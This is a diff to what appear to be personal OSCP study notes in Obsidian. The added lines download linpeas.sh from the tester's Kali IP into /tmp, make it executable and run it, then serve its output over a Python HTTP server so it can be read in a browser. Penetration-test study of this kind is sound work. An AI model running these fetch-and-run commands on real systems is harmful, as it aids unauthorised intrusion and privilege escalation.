@@ -20,10 +20,15 @@ or
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `wget http://${KaliIP}:8888/linpeas.sh`;
+const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+```
+chmod +x ./linpeas.sh && ./linpeas.sh
+```
+
+---
 
 WinPEAS
 
@@ -34,6 +39,31 @@ wget https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/wi
 ```cmd
 winPEASx64.exe
 ```
+
+---
+
+## Serve Output in Web Browser
+
+Perfect capture
+```
+script -q -c "./linpeas.sh" linpeas.txt && python3 -m http.server 8000
+```
+
+Alt Method
+
+```
+./linpeas.sh | tee -a linpeas.txt && python3 -m http.server 8000
+```
+
+Visit on browser
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `http://${ip}:8000/linpeas.txt`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 
 # 📂 LinPEAS – Linux Privilege Escalation Methodology
 
